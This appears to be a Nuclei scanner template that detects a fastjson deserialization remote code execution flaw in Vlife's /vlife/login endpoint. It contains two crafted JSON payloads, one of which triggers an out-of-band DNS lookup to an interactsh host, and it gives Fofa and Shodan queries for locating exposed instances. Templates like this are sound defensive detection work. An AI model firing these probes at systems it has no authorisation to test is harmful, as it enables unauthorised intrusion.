flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "com.alibaba.fastjson.JSONException", "autoType is not support",
      "java.lang.Runtime")
    internal: true
    name: eid
    type: dsl
  raw:
  - 'POST /vlife/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"@type":"java.lang.Runtime"}

    '
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - com.alibaba.fastjson.JSONException
  matchers-condition: and
  raw:
  - 'POST /vlife/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}

    '
id: vlife-fastjson-rce
info:
  author: omarkurt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
  description: 'alibaba/fastjson v1.2.67 within the MyUsernamePasswordAuthenticationFilter
    for processing authentication requests. The /vlife/login endpoint directly deserializes
    the raw HTTP request body using JSON.parseObject() without enforcing type restrictions
    or enabling safe mode, allowing unauthenticated attackers to exploit known fastjson
    gadget chains for Remote Code Execution.

    '
  metadata:
    fofa-query: http.title:"vlife"
    max-request: 2
    product: vlife
    runzero-match: any(each(service["html.titles"]), {# matches "vlife"})
    shodan-query: http.title:"vlife"
    vendor: vlife
    verified: true
  name: Vlife FastJSON - Remote Code Execution
  reference:
  - https://securitylab.github.com/advisories/GHSL-2024-300_wwwlike_vlife/
  severity: critical
  tags: vlife,fastjson,rce,vuln
